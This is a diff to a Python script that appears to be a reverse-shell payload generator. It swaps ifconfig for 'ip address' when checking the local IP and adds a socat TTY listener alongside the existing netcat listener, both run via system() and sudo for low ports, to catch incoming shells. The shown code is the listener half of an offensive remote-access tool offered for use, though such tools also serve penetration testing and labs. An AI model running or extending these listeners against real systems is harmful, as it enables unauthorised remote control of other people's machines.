@@ -16,7 +16,7 @@ Examples:
     exit_code(-1)
 
 def verify_ip(ipaddr):
-    output = check_output(['ifconfig']).decode()
+    output = check_output(['ip', 'address']).decode()
     candidate_ips = [ip for ip in findall(r"(?:\d{1,3}\.){3}\d{1,3}",output) if '255' not in ip]
 
     return ipaddr in candidate_ips
@@ -47,9 +47,17 @@ def main():
     c = input('Select your payload, press "l" to listen on port {} or enter to exit: '.format(port))
     if c == 'l':
         if int(port) < 1024:
-            system('sudo nc -n -v -l -s {} -p {}'.format(ipaddr, port))
+            if shell_type == 'SOCAT':
+                print(shell_type)
+                system('sudo socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
+            else:
+                system('sudo nc -n -v -l -s {} -p {}'.format(ipaddr, port))
         else:
-            system('nc -n -v -l -s {} -p {}'.format(ipaddr, port))
+            if shell_type == 'SOCAT':
+                print(shell_type)
+                system('socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
+            else:
+                system('nc -n -v -l -s {} -p {}'.format(ipaddr, port))
 
 if __name__ == "__main__":
     main()
